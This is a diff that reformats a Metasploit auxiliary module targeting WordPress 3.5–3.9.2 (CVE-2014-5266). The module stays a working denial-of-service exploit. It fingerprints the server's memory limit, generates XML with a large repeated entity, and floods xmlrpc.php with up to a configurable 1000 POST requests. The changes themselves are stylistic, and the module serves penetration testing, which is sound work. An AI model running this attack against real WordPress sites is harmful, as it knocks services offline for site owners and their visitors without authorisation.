@@ -8,21 +8,21 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Wordpress XMLRPC DoS',
-      'Description'   => %q{
-        Wordpress XMLRPC parsing is vulnerable to a XML based denial of service.
-        This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are
-        also patched).
-      },
-      'Author'        =>
-        [
-          'Nir Goldshlager',    # advisory
+    super(
+      update_info(
+        info,
+        'Name' => 'Wordpress XMLRPC DoS',
+        'Description' => %q{
+          Wordpress XMLRPC parsing is vulnerable to a XML based denial of service.
+          This vulnerability affects Wordpress 3.5 - 3.9.2 (3.8.4 and 3.7.4 are
+          also patched).
+        },
+        'Author' => [
+          'Nir Goldshlager', # advisory
           'Christian Mehlmauer' # metasploit module
         ],
-      'License'       => MSF_LICENSE,
-      'References'    =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2014-5266'],
           ['URL', 'https://wordpress.org/news/2014/08/wordpress-3-9-2/'],
           ['URL', 'http://www.breaksec.com/?p=6362'],
@@ -30,19 +30,27 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://core.trac.wordpress.org/changeset/29404'],
           ['WPVDB', '7526']
         ],
-      'DisclosureDate'=> '2014-08-06'
-    ))
+        'DisclosureDate' => '2014-08-06',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
-    [
-      OptInt.new('RLIMIT', [ true, "Number of requests to send", 1000 ])
-    ])
+      [
+        OptInt.new('RLIMIT', [ true, 'Number of requests to send', 1000 ])
+      ]
+    )
 
     register_advanced_options(
-    [
-      OptInt.new('FINGERPRINT_STEP', [true, "The stepsize in MB when fingerprinting", 8]),
-      OptInt.new('DEFAULT_LIMIT', [true, "The default limit in MB", 8])
-    ])
+      [
+        OptInt.new('FINGERPRINT_STEP', [true, 'The stepsize in MB when fingerprinting', 8]),
+        OptInt.new('DEFAULT_LIMIT', [true, 'The default limit in MB', 8])
+      ]
+    )
   end
 
   def rlimit
@@ -64,17 +72,17 @@ class MetasploitModule < Msf::Auxiliary
     while memory_to_use < 1024
       vprint_status("trying memory limit #{memory_to_use}MB")
       opts = {
-        'method'  => 'POST',
-        'uri'     => wordpress_url_xmlrpc,
-        'data'    => generate_xml(memory_to_use),
-        'ctype'   =>'text/xml'
+        'method' => 'POST',
+        'uri' => wordpress_url_xmlrpc,
+        'data' => generate_xml(memory_to_use),
+        'ctype' => 'text/xml'
       }
 
       begin
         # low timeout because the server error is returned immediately
-        res = send_request_cgi(opts, timeout = 3)
-      rescue ::Rex::ConnectionError => exception
-        print_error("unable to connect: '#{exception.message}'")
+        res = send_request_cgi(opts, 3)
+      rescue ::Rex::ConnectionError => e
+        print_error("unable to connect: '#{e.message}'")
         break
       end
 
@@ -104,26 +112,26 @@ class MetasploitModule < Msf::Auxiliary
     # Wordpress only resolves one level of entities so we need
     # to specify one long entity and reference it multiple times
     xml = '<?xml version="1.0" encoding="iso-8859-1"?>'
-    xml << "<!DOCTYPE %{doctype} ["
-    xml << "<!ENTITY %{entity} \"%{entity_value}\">"
+    xml << '<!DOCTYPE %<doctype>s ['
+    xml << '<!ENTITY %<entity>s "%<entity_value>s">'
     xml << ']>'
     xml << '<methodCall>'
     xml << '<methodName>'
-    xml << "%{payload}"
+    xml << '%<payload>s'
     xml << '</methodName>'
     xml << '<params>'
-    xml << "<param><value>%{param_value_1}</value></param>"
-    xml << "<param><value>%{param_value_2}</value></param>"
+    xml << '<param><value>%<param_value_1>s</value></param>'
+    xml << '<param><value>%<param_value_2>s</value></param>'
     xml << '</params>'
     xml << '</methodCall>'
 
     empty_xml = xml % {
-      :doctype => '',
-      :entity => '',
-      :entity_value => '',
-      :payload => '',
-      :param_value_1 => '',
-      :param_value_2 => ''
+      doctype: '',
+      entity: '',
+      entity_value: '',
+      payload: '',
+      param_value_1: '',
+      param_value_2: ''
     }
 
     space_to_fill = size_bytes - empty_xml.size
@@ -133,12 +141,12 @@ class MetasploitModule < Msf::Auxiliary
     entity_value_length = space_to_fill - payload.length
 
     payload_xml = xml % {
-      :doctype => doctype,
-      :entity => entity,
-      :entity_value => Rex::Text.rand_text_alpha(entity_value_length),
-      :payload => payload,
-      :param_value_1 => param_value_1,
-      :param_value_2 => param_value_2
+      doctype: doctype,
+      entity: entity,
+      entity_value: Rex::Text.rand_text_alpha(entity_value_length),
+      payload: payload,
+      param_value_1: param_value_1,
+      param_value_2: param_value_2
     }
 
     payload_xml
@@ -146,7 +154,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     # get the max size
-    print_status("trying to fingerprint the maximum memory we could use")
+    print_status('trying to fingerprint the maximum memory we could use')
     size = fingerprint
     print_status("using #{size}MB as memory limit")
 
@@ -156,18 +164,18 @@ class MetasploitModule < Msf::Auxiliary
     for x in 1..rlimit
       print_status("sending request ##{x}...")
       opts = {
-        'method'  => 'POST',
-        'uri'     => wordpress_url_xmlrpc,
-        'data'    => xml,
-        'ctype'   =>'text/xml'
+        'method' => 'POST',
+        'uri' => wordpress_url_xmlrpc,
+        'data' => xml,
+        'ctype' => 'text/xml'
       }
       begin
         c = connect
         r = c.request_cgi(opts)
         c.send_request(r)
         # Don't wait for a response, can take very long
-      rescue ::Rex::ConnectionError => exception
-        print_error("unable to connect: '#{exception.message}'")
+      rescue ::Rex::ConnectionError => e
+        print_error("unable to connect: '#{e.message}'")
         return
       ensure
         disconnect(c) if c
